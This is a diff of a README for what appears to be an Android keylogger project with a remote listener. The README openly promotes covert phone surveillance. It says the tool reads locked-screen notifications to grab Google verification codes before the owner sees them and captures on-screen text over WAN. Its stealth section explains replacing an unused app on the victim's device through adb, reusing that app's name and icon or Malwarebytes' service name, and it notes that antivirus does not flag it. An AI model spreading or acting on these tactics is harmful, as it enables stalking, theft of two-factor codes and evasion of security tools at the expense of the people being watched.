@@ -48,20 +48,20 @@ sorry for the low quality, 10mb gif size limit
 
 
 
-# Update: changed my username and wont guide any more detailed custom stealth options (see recent update bellow in stealth section)
-as much as I love working on this project, I need to find the time to do so.
+# Update: changed my username, updating this and adding full video guides on more stealth will be a bit)
+
 
 TODO:
-add tab for reddit, twitter, firefox
+add tab for reddit, twitter, firefox (the message sender does not use ssl as of right now)
 # Listener Features ![Linode](https://img.shields.io/badge/Supports-Linode-green)  ![Linode](https://img.shields.io/badge/Kali-Linux-blue)
 
 ✅ reads hidden notifications in locked state (grabs google code before owner sees it)
 
 ✅ grabs almost all text on the screen the user is looking at.
 
-✅ works over WAN
+✅ works over WAN without open ports on phones end
 
-✅ filtered tabs for different apps to reduce logs for easy reading (many revissions and re-compiles with many high filtered precise tweaks to make this work)
+✅ filtered tabs for different apps to reduce logs for easy reading 
 
 ✅ 300+ lines of error free custom code 
 
@@ -101,7 +101,7 @@ sudo ufw allow 4444 "if on linode or on WAN" no need for open ports on android's
 
 
 # STEALTH (tldr under this)
-# I will make a full video showing how to build apk with any app name and icon then remotely install in place of old app) "if i get any support"
+# I will make a full video showing how to build apk with any app name and icon then remotely install in place of old app) "if i get any support" or i just find the time.
 this would allow you to (after adb into device) delete apk thats never used, then replace with your own custom app, you could
 delete a downloaded files app they dont use and build the keylogger to use the same name and icon, better yet i can show how to copy
 malwarebytes service name! you can easily just ctrl+F the code in AS and edit the names and see where the icon goes.
@@ -194,15 +194,15 @@ installed apps section in settings, could show as a blank icon as ZBatteryHealth
 
 
 # Donate![icon](https://user-images.githubusercontent.com/28081004/214497772-e0d74e0c-66ca-4e1c-a88f-d0709b62890d.png)💜
-thank you for the 12th star :)⭐ anysoft keyboard and malwarebytes has no issue with apk
-adding a clear logs button may be in the future.
+thank you for the 13th star :)⭐ anysoft keyboard and malwarebytes has no issue with apk
+
 
 
 
 
 I'm very excited to announce this is my first app coded and built in AS and first GitHub project, seeing this here alone was worth it, I seen i got
 5 downloads and went to tidy this up a little bit I got so excited. Please leave a star if you like this project, would love to move up in the
-android-keylogger tag :) java listener is 1 of a kind, original content without forks. Wow 12 stars! thank you guys so much, glad to announce WAN support.
+android-keylogger tag :) java listener is 1 of a kind, original content without forks. Wow 13 stars! thank you guys so much, glad to announce WAN support.
 
 If you've found my work to be valuable, I would greatly appreciate your support, Leave a star. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!
 
